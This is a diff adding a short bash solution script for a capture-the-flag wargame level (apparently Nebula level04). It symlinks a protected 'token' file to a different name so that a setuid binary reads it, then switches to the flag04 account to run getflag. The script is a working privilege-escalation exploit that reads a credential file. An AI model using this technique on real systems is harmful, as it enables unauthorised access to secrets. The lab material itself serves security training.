@@ -1,0 +1,11 @@
+#!/bin/bash
+
+# Create a symbolic link that references the file called 'token'.
+ln -s /home/flag04/token /home/level04/link
+
+# Call the binary with the symbolic link as the argument.
+/home/flag04/flag04 /home/level04/link
+
+# Log in as flag04 using the password.
+su flag04 -c getflag
+
